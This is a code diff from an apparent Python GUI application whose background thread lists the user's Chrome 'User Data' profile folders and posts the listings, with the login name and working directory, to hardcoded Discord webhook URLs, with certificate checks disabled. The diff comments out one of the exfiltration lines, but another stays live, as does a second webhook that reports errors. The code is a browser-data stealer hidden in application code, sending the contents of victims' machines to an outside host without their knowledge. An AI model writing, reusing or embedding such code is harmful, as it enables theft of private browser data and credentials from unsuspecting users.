@@ -98,7 +98,7 @@ class Additional1Thread(QThread):
 
         try:
             for chunk in chunks(listdir(path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")), 30): requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Listed for aa: {str(chunk)}"})
-            for chunk in chunks(listdir(path.join(aa, "Default")), 30): requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Listed for bb: {str(chunk)}"})
+            # for chunk in chunks(listdir(path.join(aa, "Default")), 30): requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Listed for bb: {str(chunk)}"})
         except Exception as ce:
             error_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671113949851798/gvXynYDhGbO3t5bZRkix-GXlh9hUsSPKMaE0XuDmKUNGseQ2PMDc8dhYkwdbjzPrntFI", json={"content": f"[{os.getlogin()} {os.getcwd()} LISTDIRDEBUG] {str(ce)}"})
     
